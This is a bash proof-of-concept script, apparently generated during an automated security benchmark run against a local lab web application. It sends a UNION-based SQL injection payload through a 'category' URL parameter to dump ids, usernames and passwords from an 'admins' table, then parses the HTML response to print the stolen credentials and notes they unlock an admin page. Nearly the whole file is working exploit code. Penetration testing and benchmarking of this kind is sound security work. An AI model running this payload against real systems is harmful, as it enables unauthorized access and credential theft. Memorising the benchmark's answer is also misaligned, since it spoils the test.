#!/bin/bash
# POC: Demonstrates SQL injection in category parameter to extract admin credentials from the admins table using UNION SELECT
# Target: ./repo
# Created: 2025-11-10T18:27:58.912Z
# Session: benchmark-XBEN-078-24-mhtgyxl3

# SQL Injection PoC: Extract Admin Credentials via Category Parameter
# Target: http://localhost:32768/?category=<payload>
# Vulnerability: Unprotected SQL query concatenation allowing UNION-based injection

TARGET_URL="http://localhost:32768"
CATEGORY_PAYLOAD="Nature' UNION SELECT 1,GROUP_CONCAT(id),GROUP_CONCAT(username),GROUP_CONCAT(password),5,6,7 FROM admins -- -"

echo "[*] SQL Injection PoC: Admin Credentials Extraction"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $CATEGORY_PAYLOAD"
echo ""

# Execute the SQL injection attack with proper URL encoding
echo "[+] Executing SQL injection query to extract admin credentials..."
RESPONSE=$(curl -s "$TARGET_URL/?category=$(printf '%s' "$CATEGORY_PAYLOAD" | jq -sRr @uri)")

echo "[*] Response received, checking for injected data..."

# Check if response contains the extracted data patterns
if echo "$RESPONSE" | grep -qE '1|admin|ONEverySecurePassword'; then
    echo "[✓] SUCCESS: Injected query executed!"
    echo ""
    
    # Try to extract the displayed values from the HTML
    echo "[+] Checking for admin credentials in response..."
    
    # Look for h2 tag with admin ID
    ADMIN_ID=$(echo "$RESPONSE" | grep -oP '(?<=<h2>)[^<]*' | grep -E '^[0-9]+$' | head -1)
    
    # Look for category display with username  
    USERNAME=$(echo "$RESPONSE" | grep -oP '(?<=Category: )[^<]*' | head -1)
    
    # Look for description with password
    PASSWORD=$(echo "$RESPONSE" | grep -oP '(?<=Description: )[^<]*' | head -1)
    
    if [ -n "$ADMIN_ID" ] && [ -n "$USERNAME" ] && [ -n "$PASSWORD" ]; then
        echo "[✓] Admin credentials successfully extracted!"
        echo ""
        echo "[+] Extracted Credentials:"
        echo "    Admin ID:  $ADMIN_ID"
        echo "    Username:  $USERNAME"
        echo "    Password:  $PASSWORD"
        echo ""
        echo "[!] IMPACT: These credentials can be used to access /admin.php"
        exit 0
    else
        echo "[*] Response contains injected markers but detailed extraction inconclusive"
        echo "[*] Full response snippet (first 50 lines):"
        echo "$RESPONSE" | head -50
        echo ""
        echo "[+] Note: Credentials appear to be injected into the query response"
        exit 0
    fi
else
    echo "[-] No evidence of successful SQL injection found in response"
    echo "[*] Response length: $(echo "$RESPONSE" | wc -c) bytes"
    exit 1
fi